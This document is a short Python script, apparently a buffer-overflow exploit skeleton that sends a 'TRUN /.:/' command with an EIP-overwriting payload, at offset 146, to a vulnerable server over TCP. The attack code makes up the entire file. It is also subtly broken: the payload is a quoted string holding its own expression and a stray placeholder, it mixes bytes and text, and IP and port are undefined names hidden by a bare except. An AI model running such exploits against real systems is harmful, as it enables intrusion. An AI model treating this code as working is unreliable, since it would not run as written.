#!/usr/bin/python

import sys,socket

offset = 146
shellcode = b"(('A' * offset) + ('B' * #EIP_length ))"

try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect(('IP',port))
                            s.send (('TRUN /.:/' + shellcode))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()
